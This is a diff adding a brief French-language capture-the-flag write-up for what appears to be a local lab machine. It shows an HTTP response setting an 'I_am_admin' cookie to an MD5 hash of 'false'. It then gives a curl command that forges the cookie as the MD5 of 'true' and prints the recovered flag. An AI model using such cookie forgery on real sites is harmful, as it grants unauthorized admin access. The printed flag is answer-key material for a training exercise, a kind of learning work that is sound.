@@ -1,0 +1,26 @@
+Quand on reqarde les headers http: 
+
+$ curl -i http://192.168.56.103/ | head
+HTTP/1.1 200 OK
+Server: nginx/1.8.0
+Date: Tue, 18 Feb 2020 13:09:16 GMT
+Content-Type: text/html
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/5.3.10-1ubuntu3.19
+Set-Cookie: I_am_admin=68934a3e9455fa72420237eb05902327; expires=Tue, 18-Feb-2020 14:09:16 GMT
+
+<!DOCTYPE HTML>
+
+On peux voir:
+Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
+
+Sa ressemble a du MD5
+
+Bingo : https://www.md5online.org/md5-decrypt.html
+Le hash veux dire false
+
+Tentons avec un true...
+
+$ cook=$(echo -n true | md5) && curl -i --cookie 'I_am_admin='"$cook" http://192.168.56.103 | grep Flag
+<script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script><!DOCTYPE HTML>
